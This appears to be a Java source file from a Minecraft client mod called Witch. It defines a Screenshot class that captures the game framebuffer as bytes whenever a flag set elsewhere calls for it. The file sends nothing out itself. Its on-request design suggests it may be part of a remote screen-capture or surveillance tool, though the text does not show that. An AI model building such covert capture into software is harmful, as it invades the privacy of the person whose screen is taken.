package me.soda.witch.features;

import me.soda.witch.Witch;
import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.util.ScreenshotRecorder;

import java.io.IOException;

public class Screenshot {
    private static boolean screenshot = false;

    public static byte[] takeScreenshot() throws IOException {
        NativeImage nativeImage = ScreenshotRecorder.takeScreenshot(Witch.mc.getFramebuffer());
        return nativeImage.getBytes();
    }

    public static boolean canScreenshot() {
        boolean sc = screenshot;
        if (sc) screenshot = false;
        return sc;
    }

    public static void screenshot() {
        screenshot = true;
    }
}
